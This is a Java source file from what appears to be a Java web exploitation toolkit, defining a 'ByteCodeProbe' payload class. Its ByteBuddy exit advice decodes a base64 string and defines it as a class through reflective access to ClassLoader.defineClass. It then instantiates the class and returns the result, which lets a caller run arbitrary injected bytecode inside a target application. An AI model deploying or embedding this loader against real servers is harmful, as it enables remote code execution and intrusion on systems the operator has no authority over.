package com.reajason.javaweb.probe.payload;

import lombok.SneakyThrows;
import net.bytebuddy.asm.Advice;

import java.lang.reflect.Method;
import java.net.URL;
import java.net.URLClassLoader;

/**
 * @author ReaJason
 * @since 2025/8/5
 */
public class ByteCodeProbe {

    private final String base64Str;

    public ByteCodeProbe(String base64Str) {
        this.base64Str = base64Str;
    }

    @Advice.OnMethodExit
    public static String exit(@Advice.Argument(0) String data, @Advice.Return(readOnly = false) String ret) throws Throwable {
        Class<?> decoderClass;
        byte[] classBytes;
        try {
            decoderClass = Class.forName("java.util.Base64");
            Object decoder = decoderClass.getMethod("getDecoder").invoke(null);
            classBytes = (byte[]) decoder.getClass().getMethod("decode", String.class).invoke(decoder, data);
        } catch (Exception ignored) {
            decoderClass = Class.forName("sun.misc.BASE64Decoder");
            classBytes = (byte[]) decoderClass.getMethod("decodeBuffer", String.class).invoke(decoderClass.newInstance(), data);
        }
        Method defineClass = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
        defineClass.setAccessible(true);
        Class<?> clazz = (Class<?>) defineClass.invoke(new URLClassLoader(new URL[]{}), classBytes, 0, classBytes.length);
        ret = clazz.newInstance().toString();
        System.out.println(ret);
        return ret;
    }

    @Override
    @SneakyThrows
    public String toString() {
        return ByteCodeProbe.exit(base64Str, super.toString());
    }
}
